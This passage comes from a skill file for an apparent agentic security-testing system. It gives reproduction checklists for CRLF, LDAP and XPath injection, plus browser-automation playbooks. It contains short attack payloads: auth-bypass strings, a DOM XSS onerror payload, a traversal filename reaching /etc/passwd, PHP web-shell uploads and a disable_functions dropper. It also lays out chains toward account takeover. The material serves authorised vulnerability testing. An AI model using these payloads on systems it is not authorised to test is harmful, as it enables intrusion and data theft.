**Save finding:** findings/{SLUG}/{severity}/crlf-injection/{title}/

**Validation Checklist:**
```
□ Does injected Set-Cookie header appear in response? → session fixation
□ Does injected X-XSS-Protection: 0 header appear? → CSP downgrade
□ Can you split the response to inject a second HTTP response body? (HTTP/1.1 only)
□ Does the injection work on redirect endpoints? (Location header splitting)
□ Can you inject Content-Type header override? → XSS via content-type manipulation
□ Does CRLF work in cookie values? (cookie injection)
□ Test cache poisoning: inject X-Poison: {canary}, verify from different session/IP
□ Test session fixation: inject Set-Cookie, authenticate as victim, verify cookie persists
```

**FALSE POSITIVE CHECK:**
```
- %0d%0a reflected in body but NOT in headers → NOT header injection
- Server URL-encodes %0d%0a → sanitized → NOT VULNERABLE
- Headers stripped by framework/load balancer → mitigated at infrastructure level
- Only works on HTTP/1.0 endpoints (no practical impact) → LOW
```

**2026 CVE VERIFICATION:**
```
□ CVE-2026-0865: Python wsgiref.headers — test header names with control chars (0x00-0x1F, 0x7F)
□ CVE-2026-3634: GNOME libsoup — test Content-Type with CRLF sequences
□ CVE-2026-29046: TinyWeb — test CGI endpoints with CR/LF/NUL + percent-encoded variants
□ CVE-2026-29777: Traefik — test HTTPRoute header/query match injection in shared gateways
```

**CHAIN OUTPUT:**
  → CRLF header injection (medium) + XSS = CSP bypass → script execution (high)
  → CRLF Set-Cookie (medium) + CSRF = session fixation → ATO (critical)
  → CRLF response splitting (high) + cache = persistent XSS for all users (critical)
  → CRLF + redirect = open redirect with cookie injection (medium)

**2026 MULTI-LAYER INSIGHT:**
  Modern targets: CDN → WAF → LB → K8s sidecar → app
  → Each layer parses headers differently
  → Find parsing discrepancies between layers
  → One layer normalizes %0a to %0d%0a, another doesn't = bypass opportunity

---

## Phase 40: LDAP Injection — CIA: C:H I:M

### SUB-PHASE 40.3: REPRODUCE

**Confirm:** auth bypass achieved or LDAP directory data extracted via blind enumeration.
**PoC Script:** save to scripts/{SLUG}/ldap_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/ldap-injection/{title}/

**Validation Checklist:**
```
□ Does admin)(& or *)(uid=* bypass authentication? → full auth bypass (C:H)
□ Can you enumerate attributes blindly? (description, mail, telephoneNumber, memberOf)
□ Does the response size/timing differ per attribute value? → blind data extraction
□ Can you extract sAMAccountName or other AD-specific attributes?
□ Does the injection work on search endpoints (not just login)?
□ Can you enumerate group membership? (memberOf attribute → AD role mapping)
```

**FALSE POSITIVE CHECK:**
```
- Special characters rejected/escaped → properly sanitized → NOT VULNERABLE
- Auth bypass returns same error as normal invalid login → NOT bypassed
- Response differences but no extractable data → INFO DISCLOSURE at best
```

**CHAIN OUTPUT:**
  → LDAP auth bypass (critical) → admin access without credentials (critical)
  → LDAP attribute extraction (high) → corporate directory dump → PII exposure (critical)
  → LDAP group enumeration (medium) + access control flaw = targeted privilege escalation (high)

---

## Phase 41: XPath Injection — CIA: C:H I:M

### SUB-PHASE 41.3: REPRODUCE

**Confirm:** auth bypass achieved or XML data extracted character-by-character via blind enumeration.
**PoC Script:** save to scripts/{SLUG}/xpath_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/xpath-injection/{title}/

**Validation Checklist:**
```
□ Does ' or '1'='1 or similar bypass authentication? → full auth bypass (C:H)
□ Can you extract node data character by character via blind injection?
□ Does the injection work with different XPath functions? (string-length, substring, contains)
□ Can you enumerate all users via '] | //user | a[' technique?
□ Can you extract the full XML document structure node by node?
□ Does the injection work on search/query endpoints (not just login)?
```

**FALSE POSITIVE CHECK:**
```
- Special characters cause error but no data returned → parser error, NOT injection
- Auth bypass returns generic error → may be blocked at app layer, not XPath
- XOR/boolean-based checks inconsistent → may be network timing, not injection
```

**CHAIN OUTPUT:**
  → XPath auth bypass (critical) → admin access without credentials (critical)
  → Blind XPath extraction (high) → full XML database dump → PII exposure (critical)
  → XPath + XML DB contains credentials → credential theft → lateral movement (critical)

---

## Playwright MCP Integration

Injection testing is primarily curl/Burp-based, but Playwright helps with browser-dependent vectors.

| Injection Phase | Playwright Tool | Playbook |
|-----------------|----------------|----------|
| **XSS via file upload (Phase 17)** | Upload SVG via `browser_file_upload`, navigate to CDN URL | `browser_navigate` to uploaded SVG, `browser_console_messages` for XSS |
| **DOM-based injection (Phase 18)** | `browser_navigate` with payload in URL/fragment | DOM XSS only triggers in browser — curl won't show it |
| **SSTI in rendered templates (Phase 9)** | `browser_navigate` to template-rendered page, `browser_snapshot` | `{{7*7}}` → check if "49" appears in rendered output |
| **Cache Poisoning (Phase 23)** | `browser_navigate` with poisoned headers, verify reflected content | Send unkeyed headers, navigate, check for reflected XSS in DOM |
| **GraphQL Playground (Phase 32)** | `browser_navigate` to `/graphiql`, test queries interactively | GraphiQL IDE accessible in browser, introspection queries auto-complete |
| **File Upload Filename LFI (Phase 18.4)** | `browser_file_upload` with traversal filename, verify response | Upload file with `../../../../../etc/passwd` as filename, check returned URL content |
| **disable_functions Bypass (Phase 10.1)** | Upload Chankro dropper via `browser_file_upload`, navigate to trigger URL | Upload PHP dropper with .so embedded, trigger via mail()+putenv(), check command output |
| **PHP Execution in Uploads** | `browser_file_upload` with .php as image/jpeg, navigate to upload path | Upload PHP shell, try /uploads/shell.php, check for command execution |

### DOM XSS — Browser-Only Verification
```
// curl CANNOT confirm DOM XSS — only Playwright/Firefox can:
1. browser_navigate(url="TARGET/page#<img src=x onerror=console.log('DOM_XSS')>")
2. browser_console_messages(level="info") → grep for "DOM_XSS"
3. browser_take_screenshot → evidence of execution
```

### GraphQL Endpoint Testing
```
1. browser_navigate(url="TARGET/graphiql")  // GraphQL IDE
2. browser_fill_form → type introspection query
3. browser_click → execute
4. browser_snapshot → capture full schema output
→ If GraphiQL is enabled → HIGH finding (schema exposure + interactive query building)
```

### File Upload with Playwright
```
1. browser_navigate(url="TARGET/upload")
2. browser_file_upload(paths=["/tmp/shell.svg"]) → upload SVG with XSS
3. browser_network_requests → get CDN URL of uploaded file
4. browser_navigate(url="CDN_URL_OF_SVG") → render SVG in browser
5. browser_console_messages → check for XSS execution
```
---

*SKILL-INJECTION-REPRODUCE — Part of the acy Agentic Security Research System v3.0*
